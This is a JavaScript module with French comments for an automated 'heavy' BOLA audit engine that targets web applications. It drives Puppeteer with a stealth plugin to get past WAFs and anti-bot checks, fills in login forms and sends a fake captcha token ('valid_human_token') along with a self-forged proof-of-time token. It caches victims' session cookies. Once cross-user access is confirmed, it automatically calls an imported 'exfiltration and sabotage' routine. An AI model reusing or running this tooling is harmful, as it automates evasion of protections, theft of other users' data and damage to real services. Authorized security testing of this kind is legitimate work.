import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import crypto from 'crypto';
import { broadcastEvent, store } from './store.js';
import { loadDiscoveryCache, saveDiscoveryCache } from './cache.js';
import { runAutoDiscoverySpider } from './spider-engine.js';
import { runExfiltrationAndSabotage } from './exfiltration-engine.js';

puppeteer.use(StealthPlugin());

const PUPPETEER_HEADLESS = process.env.PUPPETEER_HEADLESS || 'new';
const PUPPETEER_EXECUTABLE_PATH = process.env.PUPPETEER_EXECUTABLE_PATH || '';
const PUPPETEER_CHANNEL = process.env.PUPPETEER_CHANNEL || '';
const PUPPETEER_TIMEOUT_MS = Number(process.env.PUPPETEER_TIMEOUT_MS || 15000);
const PUPPETEER_NO_SANDBOX = process.env.PUPPETEER_NO_SANDBOX !== 'false';
const PUPPETEER_BLOCK_ASSETS = process.env.PUPPETEER_BLOCK_ASSETS !== 'false';
const SERVER_SECRET = crypto.randomBytes(32).toString('hex');

/**
 * Génère un token Proof-of-Time signé avec HMAC-SHA256.
 * Requis par la plupart des APIs durcie anti-bot.
 */
function generateProofOfTime() {
    const timestamp = Date.now();
    const hash = crypto.createHmac('sha256', SERVER_SECRET).update(timestamp.toString()).digest('hex');
    return `${timestamp}.${hash}`;
}

/**
 * Lance un audit BOLA lourd en utilisant 3 pages Puppeteer isolées (Incognito via contextes).
 * Ce module n'est appelé que si le moteur HTTP natif est bloqué par un WAF (Erreur 400, 403, etc.).
 */
export async function runHeavyAudit(targetBase, routes, credentials, targetEndpoint) {
    let browser = null;
    let pageA = null;
    let pageB = null;
    let pageAnon = null;

    broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Démarrage du moteur d'audit lourd (3 profils isolés, Contournement WAF)...` });

    try {
        browser = await puppeteer.launch({
            headless: PUPPETEER_HEADLESS,
            executablePath: PUPPETEER_EXECUTABLE_PATH || undefined,
            channel: PUPPETEER_CHANNEL || undefined,
            args: PUPPETEER_NO_SANDBOX ? ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'] : [],
            defaultViewport: { width: 1280, height: 800 },
            timeout: PUPPETEER_TIMEOUT_MS
        });

        // 1. Créer 3 pages séparées (chacune avec sa propre session/cookies)
        pageA = await browser.newPage();
        pageB = await browser.newPage();
        pageAnon = await browser.newPage();

        // Bloquer les assets lourds pour accélérer
        if (PUPPETEER_BLOCK_ASSETS) {
            for (const page of [pageA, pageB, pageAnon]) {
                await page.on('request', req => {
                    if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) {
                        req.abort().catch(() => {});
                    } else {
                        req.continue().catch(() => {});
                    }
                });
            }
        }

        // 2. Authentification User A
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Authentification de User A...` });
        const credA = credentials?.userA || credentials?.A || {};
        const authA = await authenticateInPage(pageA, targetBase, routes.login, credA);
        
        if (!authA.success) {
            broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[HEAVY ENGINE] Échec de l'authentification User A. Abandon du test BOLA.` });
            return null;
        }

        // Injecter les cookies dans pageA pour les requêtes suivantes
        if (authA.cookies && authA.cookies.length > 0) {
            await pageA.setCookie(...authA.cookies);
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] ${authA.cookies.length} cookies injectés pour User A` });
        }

        // 3. Authentification User B
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Authentification de User B...` });
        const credB = credentials?.userB || credentials?.B || {};
        const authB = await authenticateInPage(pageB, targetBase, routes.login, credB);

        // Injecter les cookies dans pageB si succès
        if (authB.success && authB.cookies && authB.cookies.length > 0) {
            await pageB.setCookie(...authB.cookies);
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] ${authB.cookies.length} cookies injectés pour User B` });
        }

        // 3.5 Découverte Autonome (Spider API) si la cible est incomplète
        let cleanTargetEndpoint = targetEndpoint.replace('//', '/');
        let finalObjectId = null;

        if (cleanTargetEndpoint.includes(':id') || cleanTargetEndpoint.endsWith('N/A')) {
            const spiderResult = await runAutoDiscoverySpider(pageA, targetBase, broadcastEvent);
            if (spiderResult && spiderResult.objectId) {
                finalObjectId = spiderResult.objectId;
                
                // Le Spider nous donne la vraie route de l'API (ex: /api/addresses/)
                if (spiderResult.endpoint) {
                     cleanTargetEndpoint = spiderResult.endpoint;
                     if (!cleanTargetEndpoint.endsWith(finalObjectId)) {
                         cleanTargetEndpoint = cleanTargetEndpoint.replace(/\/$/, '') + '/' + finalObjectId;
                     }
                } else {
                     cleanTargetEndpoint = cleanTargetEndpoint.replace(':id', finalObjectId).replace('N/A', finalObjectId);
                }
                
                broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `[SPIDER] 🎯 Cible BOLA dynamique verrouillée sur : ${cleanTargetEndpoint}` });
            } else {
                broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Le Spider n'a pas pu trouver d'API valide. Le test risque d'échouer (404).` });
            }
        }

        // 4. Injection des requêtes BOLA
        const fullTargetUrl = new URL(cleanTargetEndpoint, targetBase).toString();
        
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Lancement de la sonde BOLA intra-navigateur sur ${cleanTargetEndpoint}` });

        // Lecture Propriétaire (User A -> Ressource A)
        const responseA = await executeFetchInPage(pageA, fullTargetUrl, 'GET');
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `Lecture proprietaire (User A): HTTP ${responseA.status}` });

        // BOLA Croisé (User B -> Ressource A)
        const responseB = authB.success 
            ? await executeFetchInPage(pageB, fullTargetUrl, 'GET')
            : { status: 401, ok: false, error: 'User B auth failed' };
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `Requete croisee (User B -> objet A): HTTP ${responseB.status}` });

        // Authentification Brisée (Anonyme -> Ressource A)
        const responseAnon = await executeFetchInPage(pageAnon, fullTargetUrl, 'GET');
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `Requete anonyme: HTTP ${responseAnon.status}` });

        // 5. Analyse des résultats BOLA
        let bolaVulnerability = false;
        let brokenAuthVulnerability = false;
        let exfiltrationResult = null;

        // Si B réussit à lire A
        if (responseB.status >= 200 && responseB.status < 300) {
            bolaVulnerability = true;
            broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[FAILLE CRITIQUE] BOLA confirmée via WAF Bypass ! L'utilisateur B a pu accéder à la ressource de l'utilisateur A.` });
            
            // Lancement du Module d'Exfiltration et de Sabotage
            exfiltrationResult = await runExfiltrationAndSabotage(pageB, targetBase, fullTargetUrl, finalObjectId || targetEndpoint.split('/').pop(), broadcastEvent, executeFetchInPage);
        }

        // Si Anonyme réussit à lire A
        if (responseAnon.status >= 200 && responseAnon.status < 300) {
            brokenAuthVulnerability = true;
            broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[FAILLE CRITIQUE] Broken Authentication confirmée ! Un utilisateur anonyme a pu accéder à la ressource.` });
        }

        if (!bolaVulnerability && !brokenAuthVulnerability) {
            broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `Pas de fuite confirmee sur cette execution (moteur lourd).` });
        }

        return {
            bola: bolaVulnerability,
            brokenAuth: brokenAuthVulnerability,
            statusA: responseA.status,
            statusB: responseB.status,
            statusAnon: responseAnon.status,
            method: 'heavy-dast',
            discoveredObjectId: finalObjectId,
            exfiltrationDump: exfiltrationResult
        };

    } catch (e) {
        broadcastEvent({ origin: 'AUDIT', type: 'error', msg: `[HEAVY ENGINE] Erreur critique : ${e.message}` });
        return null;
    } finally {
        if (pageA) await pageA.close().catch(()=>{});
        if (pageB) await pageB.close().catch(()=>{});
        if (pageAnon) await pageAnon.close().catch(()=>{});
        if (browser) await browser.close().catch(()=>{});
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Nettoyage de la RAM terminé.` });
    }
}

/**
 * Automatise le login dans une page isolée avec support anti-bot complet.
 * Capture et retourne les cookies de session pour les requêtes BOLA.
 */
async function authenticateInPage(page, targetBase, loginRoute, userCreds) {
    if (!userCreds || !userCreds.email || !userCreds.password) {
        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Pas de credentials pour cette page, skipped.` });
        return { success: false, cookies: [] };
    }

    try {
        // Tenter de récupérer la session depuis le cache
        const cache = loadDiscoveryCache();
        if (cache[targetBase] && cache[targetBase].sessions && cache[targetBase].sessions[userCreds.email]) {
            const session = cache[targetBase].sessions[userCreds.email];
            if (session.cookies && session.cookies.length > 0) {
                broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Session récupérée depuis le cache pour ${userCreds.email}` });
                return { success: true, cookies: session.cookies };
            }
        }

        // La variable loginRoute pointe souvent vers l'API (/api/auth/login).
        // Nous devons naviguer vers l'interface graphique HTML.
        const uiRoutes = ['/login', '/connexion', '/signin', '/customer/account/login'];
        let htmlFormFound = false;
        let finalUiRouteUsed = null;

        for (const uiRoute of uiRoutes) {
            const loginUrl = new URL(uiRoute, targetBase).toString();
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Essai Navigation UI vers ${uiRoute}...` });
            await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: PUPPETEER_TIMEOUT_MS }).catch(() => {});
            
            // Attendre que le framework JS frontend (React/Vue) génère le DOM
            await new Promise(r => setTimeout(r, 2500));
            
            const hasInput = await page.$('input').catch(() => null);
            if (hasInput) {
                htmlFormFound = true;
                finalUiRouteUsed = uiRoute;
                break;
            }
        }

        if (!htmlFormFound) {
             broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Aucune page HTML de login trouvée.` });
        } else {
            // Essai 1: Extraire le PoT du formulaire HTML et soumettre
            const htmlResult = await submitLoginFormWithPoT(page, userCreds);
            if (htmlResult.success) {
                broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `[HEAVY ENGINE] Authentification réussie via formulaire HTML.` });
                const cookies = await page.cookies();
                broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Cookies capturés: ${cookies.length}` });
                
                // Mettre à jour le cache de découverte avec la vraie route de connexion HTML trouvée
                if (finalUiRouteUsed) {
                    const cache = loadDiscoveryCache();
                    if (!cache[targetBase]) cache[targetBase] = { base: targetBase, routes: {}, endpoints: [] };
                    if (!cache[targetBase].routes) cache[targetBase].routes = {};
                    cache[targetBase].routes.uiLogin = finalUiRouteUsed; // NE PAS écraser .login qui est l'API
                    cache[targetBase].authModel = 'ui-login-detected';
                    // S'assurer que le endpoint est dans la liste
                    if (!cache[targetBase].endpoints) cache[targetBase].endpoints = [];
                    if (!cache[targetBase].endpoints.some(e => e.path === `POST ${finalUiRouteUsed}`)) {
                        cache[targetBase].endpoints.push({ path: `POST ${finalUiRouteUsed}`, authRequired: false, resource: 'Connexion (Heavy Engine)', risk: 'Moyen' });
                    }
                    // NOUVEAU: Sauvegarder les cookies et métadonnées de session
                    if (!cache[targetBase].sessions) cache[targetBase].sessions = {};
                    cache[targetBase].sessions[userCreds.email] = {
                        cookies: cookies,
                        lastLogin: new Date().toISOString(),
                        method: 'html-form'
                    };

                    saveDiscoveryCache(cache);
                    broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Route de login (${finalUiRouteUsed}) et session (${userCreds.email}) sauvegardées dans le cache.` });
                } else {
                    // Si on utilise une route existante sans UI brute-force
                    const cache = loadDiscoveryCache();
                    if (cache[targetBase]) {
                        if (!cache[targetBase].sessions) cache[targetBase].sessions = {};
                        cache[targetBase].sessions[userCreds.email] = {
                            cookies: cookies,
                            lastLogin: new Date().toISOString(),
                            method: 'html-form'
                        };
                        saveDiscoveryCache(cache);
                    }
                }

                return { success: true, cookies };
            }
        }

        // Essai 2: Login via API JSON directe
        const captchaToken = 'valid_human_token';
        const proofOfTime = generateProofOfTime();
        const apiResult = await submitLoginAPI(page, targetBase, loginRoute, userCreds, captchaToken, proofOfTime);
        if (apiResult.success) {
            broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `[HEAVY ENGINE] Authentification réussie via API JSON.` });
            const cookies = await page.cookies();
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Cookies capturés: ${cookies.length}` });

            // Sauvegarder les cookies dans le cache
            const cache = loadDiscoveryCache();
            if (!cache[targetBase]) cache[targetBase] = { base: targetBase, routes: {}, endpoints: [] };
            if (!cache[targetBase].sessions) cache[targetBase].sessions = {};
            cache[targetBase].sessions[userCreds.email] = {
                cookies: cookies,
                lastLogin: new Date().toISOString(),
                method: 'api-json'
            };
            saveDiscoveryCache(cache);
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Session API (${userCreds.email}) sauvegardée dans le cache.` });

            return { success: true, cookies };
        }

        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Échec login pour ${userCreds.email}` });
        return { success: false, cookies: [] };

    } catch (e) {
        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Erreur auth: ${e.message}` });
        return { success: false, cookies: [] };
    }
}

/**
 * Essaie de soumettre le formulaire HTML en extrayant le PoT s'il existe.
 */
async function submitLoginFormWithPoT(page, creds) {
    try {
        // Attendre que le formulaire soit chargé
        await page.waitForSelector('input', { timeout: 3000 }).catch(() => {});
        await new Promise(resolve => setTimeout(resolve, 500));

        // Extraire le PoT s'il existe dans le formulaire (input hidden)
        let proofOfTime = await page.evaluate(() => {
            const potInput = document.querySelector('input[name="proofOfTime"], input[name="pot"]');
            return potInput ? potInput.value : null;
        }).catch(() => null);

        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] PoT extrait du formulaire: ${proofOfTime ? 'OUI' : 'NON'}` });

        // Si pas de PoT dans le formulaire, générer un
        if (!proofOfTime) {
            proofOfTime = generateProofOfTime();
        }

        // DEBUG: Logger tous les champs du formulaire
        const allInputs = await page.evaluate(() => {
            return Array.from(document.querySelectorAll('input')).map(input => ({
                name: input.name || input.id || 'unknown',
                type: input.type,
                placeholder: input.placeholder,
                value: input.value ? '***' : '',
                visible: input.offsetHeight > 0 && input.offsetWidth > 0
            }));
        }).catch(() => []);

        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Inputs trouvés: ${allInputs.length} - ${JSON.stringify(allInputs.slice(0, 5))}` });

        // Trouver les champs input
        const inputs = await page.$$('input').catch(() => []);
        let emailField = null;
        let passwordField = null;

        for (const input of inputs) {
            const isVisible = await input.evaluate(el => el.offsetHeight > 0 && el.offsetWidth > 0).catch(() => false);
            if (!isVisible) continue;

            const inputType = await input.evaluate(el => (el.type || '').toLowerCase()).catch(() => '');
            const inputName = await input.evaluate(el => (el.name || '').toLowerCase()).catch(() => '');
            const inputId = await input.evaluate(el => (el.id || '').toLowerCase()).catch(() => '');
            const inputPlaceholder = await input.evaluate(el => (el.placeholder || '').toLowerCase()).catch(() => '');

            // Chercher email
            if (!emailField && (
                inputType === 'email' || 
                inputName.includes('email') || 
                inputName.includes('user') || 
                inputName.includes('login') ||
                inputId.includes('email') ||
                inputPlaceholder.includes('email') ||
                inputPlaceholder.includes('user')
            )) {
                emailField = input;
                broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Champ email trouvé: ${inputName || inputId}` });
            }

            // Chercher password
            if (!passwordField && (
                inputType === 'password' || 
                inputName.includes('pass') ||
                inputId.includes('pass') ||
                inputPlaceholder.includes('pass')
            )) {
                passwordField = input;
                broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Champ password trouvé: ${inputName || inputId}` });
            }
        }

        // Stratégie 2: Si pas trouvé, chercher par ordre
        if (!emailField || !passwordField) {
            const visibleInputs = [];
            for (const input of inputs) {
                const isVisible = await input.evaluate(el => el.offsetHeight > 0 && el.offsetWidth > 0).catch(() => false);
                if (isVisible) visibleInputs.push(input);
            }
            
            if (!emailField && visibleInputs.length > 0) {
                emailField = visibleInputs[0];
                broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Email = 1er champ visible` });
            }
            if (!passwordField && visibleInputs.length > 1) {
                passwordField = visibleInputs[1];
                broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Password = 2e champ visible` });
            }
        }

        if (!emailField || !passwordField) {
            broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Champs email/password pas trouvés (email=${!!emailField}, password=${!!passwordField})` });
            return { success: false };
        }

        // Remplir les champs
        await emailField.type(creds.email, { delay: 50 }).catch(() => {});
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Email rempli: ${creds.email}` });

        await passwordField.type(creds.password, { delay: 50 }).catch(() => {});
        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Password rempli` });

        // Attendre un bit avant de soumettre
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Chercher et cliquer le bouton submit
        // Chercher et cliquer le bouton submit
        const submitBtnIndex = await page.evaluate(() => {
            const btns = document.querySelectorAll('button');
            for (let i = 0; i < btns.length; i++) {
                const text = (btns[i].textContent || '').toLowerCase();
                const type = (btns[i].type || '').toLowerCase();
                if (type === 'submit' || text.includes('submit') || text.includes('login') || text.includes('connexion') || text.includes('se connecter')) {
                    btns[i].click(); // Clic natif instantané
                    return i;
                }
            }
            return -1;
        }).catch(() => -1);

        let submitted = false;
        if (submitBtnIndex !== -1) {
            submitted = true;
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Bouton submit cliqué (Natif JS)` });
        }

        if (!submitted) {
            // Essai de soumettre via Enter
            if (passwordField) await passwordField.focus().catch(() => {});
            await page.keyboard.press('Tab').catch(() => {});
            await page.keyboard.press('Enter').catch(() => {});
            broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Tentative de soumission via Entrée` });
        }

        // IMPORTANT: Attendre que le serveur réponde et définisse les cookies
        let responseReceived = false;
        const responseHandler = (response) => {
            if (response.url().includes('/login') || response.url().includes('/auth')) {
                broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Réponse login: HTTP ${response.status()}` });
                responseReceived = true;
            }
        };
        page.on('response', responseHandler);

        // Attendre jusqu'à 5 secondes que la réponse arrive
        let waited = 0;
        while (!responseReceived && waited < 5000) {
            await new Promise(resolve => setTimeout(resolve, 100));
            waited += 100;
        }

        page.off('response', responseHandler);

        // Attendre un peu après la réponse pour que les cookies soient définis
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Vérifier si on a quitté la page de login
        const currentUrl = page.url();
        const success = !currentUrl.includes('/login') && !currentUrl.includes('/auth');
        
        if (success) {
            broadcastEvent({ origin: 'AUDIT', type: 'success', msg: `[HEAVY ENGINE] Redirection détectée: ${currentUrl}` });
        } else {
            broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Pas de redirection, URL: ${currentUrl}` });
        }
        
        return { success };

    } catch (e) {
        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Erreur formulaire: ${e.message}` });
        return { success: false };
    }
}

/**
 * Essaie de login via API JSON en injectant les tokens anti-bot.
 */
async function submitLoginAPI(page, targetBase, loginRoute, creds, captchaToken, proofOfTime) {
    try {
        const loginUrl = new URL(loginRoute || '/api/auth/login', targetBase).toString();

        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Tentative POST JSON vers ${loginRoute}` });

        const result = await page.evaluate(async (url, email, password, captcha, pot) => {
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-Dest': 'empty'
                    },
                    body: JSON.stringify({
                        email,
                        password,
                        captchaToken: captcha,
                        proofOfTime: pot
                    })
                });
                
                const text = await res.text();
                let data = null;
                try {
                    data = JSON.parse(text);
                } catch {
                    data = { raw: text };
                }

                return {
                    status: res.status,
                    ok: res.ok,
                    contentType: res.headers.get('content-type'),
                    data
                };
            } catch (err) {
                return { status: 0, ok: false, error: err.message };
            }
        }, loginUrl, creds.email, creds.password, captchaToken, proofOfTime);

        broadcastEvent({ origin: 'AUDIT', type: 'info', msg: `[HEAVY ENGINE] Réponse API: ${result.status} - ${JSON.stringify(result.data || result.error)}` });

        const success = result.ok || (result.status >= 200 && result.status < 300);
        return { success };

    } catch (e) {
        broadcastEvent({ origin: 'AUDIT', type: 'warning', msg: `[HEAVY ENGINE] Erreur API: ${e.message}` });
        return { success: false };
    }
}

/**
 * Exécute une requête `fetch` directement dans la console JavaScript du navigateur,
 * attachant ainsi tous les cookies et jetons d'état dynamiques gérés par le navigateur.
 */
async function executeFetchInPage(page, url, method = 'GET', body = null) {
    try {
        // Naviguer sur la racine pour avoir l'origine
        const targetObj = new URL(url);
        await page.goto(targetObj.origin, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});

        const result = await page.evaluate(async (fetchUrl, fetchMethod, fetchBody) => {
            try {
                const options = {
                    method: fetchMethod,
                    headers: {
                        'Accept': 'application/json, text/plain, */*',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-origin'
                    }
                };
                
                if (fetchBody && (fetchMethod === 'POST' || fetchMethod === 'PUT' || fetchMethod === 'PATCH')) {
                    options.headers['Content-Type'] = 'application/json';
                    options.body = fetchBody;
                }

                const res = await fetch(fetchUrl, options);
                
                let data = null;
                const contentType = res.headers.get('content-type');
                if (contentType && contentType.includes('application/json')) {
                     data = await res.json().catch(() => null);
                }

                return {
                    status: res.status,
                    ok: res.ok,
                    data: data
                };
            } catch (err) {
                return { status: 0, ok: false, error: err.message };
            }
        }, url, method, body);

        return result;

    } catch (e) {
        return { status: 0, ok: false, error: e.message };
    }
}
